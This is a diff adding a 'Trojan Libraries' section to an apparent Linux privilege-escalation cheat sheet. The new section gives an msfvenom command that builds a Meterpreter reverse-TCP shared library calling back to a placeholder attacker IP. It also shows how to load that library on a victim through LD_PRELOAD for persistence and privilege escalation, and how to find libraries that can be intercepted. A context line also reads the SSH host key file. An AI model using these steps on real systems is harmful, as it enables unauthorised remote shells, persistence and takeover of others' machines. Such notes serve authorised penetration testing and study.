@@ -647,7 +647,21 @@ cat /etc/ssh/ssh_host_key
 
 ### Bad path configuration
 
-Require user interaction
+Requires user interaction
+
+### Trojan Libraries
+```
+For persistance and potential privesc on older distros --
+
+msfvenom -p linux/x64/mettle/reverse_tcp LHOST=INSERTIPADDRESS -f elf-so -o mettle.so
+On victim:
+export LD_PRELOAD=/mettle.so; ls
+
+Check for libraries that can be intercepted:
+ldd /usr/bin/app
+LD_PRELOAD or LD_LIBRARY_PATH loaded before /lib
+env | grep 'LD_\|RTL_'
+```
 
 ------------------------------------------------------------------------
 
